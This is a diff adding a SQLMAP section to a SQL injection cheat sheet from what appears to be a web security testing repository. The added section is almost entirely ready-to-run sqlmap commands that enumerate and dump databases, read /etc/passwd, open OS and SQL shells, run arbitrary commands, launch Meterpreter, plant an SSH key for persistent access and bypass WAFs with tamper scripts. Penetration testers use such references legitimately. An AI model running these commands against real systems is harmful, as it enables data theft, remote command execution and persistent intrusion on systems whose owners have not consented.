@@ -5,6 +5,7 @@
 - [Detection](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#detecting-sql-injection)
 - [Exploitation](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#exploitation)
 - [WAF Bypasses](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#waf-bypasses)
+- [SQLMAP](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#sqlmap)
 ---
 ### Types of SQL Injection
 
@@ -222,7 +223,79 @@ SELECT 1,2,3,4  ==>	UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELEC
 in the place of  '1' = '1'  you can use  'a'  is not  'b'
 ```
 
+## SQLMAP 
 
+* Risk and Level
+
+  * Three stages of risk, e.g. `--risk 2`
+  * Five stages of level, e.g. `--level 4`
+* Technique
+  
+  * We can specify the techniques using `--technique=EUBST`
+  * E => Error Based
+  * U => Union Based
+  * B => Boolean Based
+  * S => Stacked Querires
+  * T => Time Based
+* Cheatsheet
+```bash
+-SQLMAP
+ |
+ |1-Identifying the vulnerable injection point
+ |  |sqlmap -u 'https://example.com?id=7' 
+ |2-Fingerprinting the database helps to find the database type and the version of database that is used.
+ |  |sqlmap -u 'url' --fingerprint
+ |3-Listing all the databases
+ |  |sqlmap -u 'url' --dbs
+ |4-Enumerating the tables from a specific database
+ |  |sqlmap -u 'url' -D 'db_name' --tables
+ |5-Dumping data from column
+ |  |sqlmap -u 'url' -D 'db_name' -T 'tb_name' --dump
+ |6-Dumping all  databases info
+ |  |sqlmap -u 'url' --dump-all
+ |7-Reading a server side file
+ |  |sqlmap -u 'url' --file-read=/etc/passwd
+ |8-Skippping to default option and operate on full automatic mode
+ |  |sqlmap -u "https://example.com" --batch 
+ |9-The risk[1-3] and level[1-5], both are set to 1 by default
+ |  |sqlmap -u 'url' --risk 1 --level 1
+ |10-Shell
+ |  |os shell
+ |  |sqlmap -u "http://example.com?id=1" -p id --os-shell
+ |  |Arbitary Commands
+ |  |sqlmap -u "http://example.com?id=1" -p id --os-cmd="whoami"
+ |  |sql shell
+ |  |sqlmap -u "<url_here>" --sql-shell
+ |  |Meterpreter
+ |  |sqlmap -u "<url_here>" --os-pwn
+ |  |SSH Shell
+ |  |sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
+ |11-Automated Exploit
+ |  |*Caution: This method is not advised to pentest. It may delete the database files
+ |  |sqlmap -u "<url_here>" --batch --forms --crawl=1 --risk=3 --level=5 --random-agent --threads=5
+ |12-Proxy
+ |  |sqlmap -u "<url_here>" --proxy="http://127.0.0.1:8080" --proxy-cred=<if_any>
+ |13-Exploiting the database directly
+ |  |sqlmap -d "mysql://username:pass@IP_HERE/database" --dump-all
+ |14-Tampering
+ |  |It helps to bypass different WAF
+ |  |sqlmap -u "<url_here>" --tamper=space2comment  
+ |  |*Tampering Scripts => https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/SQLmap/#tamper-scripts 
+ |  |*Source => https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
+ |  
+ |-Another Method by using the captured http-request file
+ |  |sqlmap -r req_file.txt -p 'tested input parameter' --technique=EUBTS
+ |  |[E Error_Based / U Union_Based / B Boolean_Based / T Time_Based / S Stacked_Queries]
+ |  |sqlmap -r req_file -p 'tested param' --fingerprint
+ |  |sqlmap -r req_file -p 'tested param' --dbs
+ |  |sqlmap -r req_file -p 'tested param' -D 'db_name' --tables
+ |  |sqlmap -r req_file -p 'tested param' -D 'db_name' -T 'tb_name' --dump
+ |  |sqlmap -r req_file -p 'tested param' --dump-all
+
+```
+
+
+It is an automated command line tool to check for SQL Database vulnerabilities and also helps to craft payloads.
 
 
 
